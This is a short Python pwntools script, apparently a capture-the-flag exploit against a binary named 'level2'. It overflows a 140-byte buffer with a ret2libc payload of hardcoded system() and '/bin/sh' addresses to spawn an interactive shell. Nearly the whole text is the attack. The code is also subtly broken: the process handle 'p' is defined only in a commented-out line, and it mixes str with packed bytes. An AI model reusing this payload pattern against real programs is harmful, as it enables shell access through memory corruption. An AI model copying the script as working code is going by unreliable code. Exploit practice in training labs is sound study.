import struct
from pwn import*

system=0xf7e195a0
sh=0xf7f58b35
ret=0xdeadbeef

#p=process('./level2')

#exp= 'A'*140+struct.pack("I",system)+struct.pack("I",ret)+struct.pack("I",sh)

#exp = ('A'*140)+p32(system) +p32(ret) + p32(sh)

exp= 'A'*140+struct.pack("I",0xf7e195a0)+struct.pack("I", 0xdeadbeef)+struct.pack("I", 0xf7f58b35)

print(exp)

p.send(exp)
p.interactive()


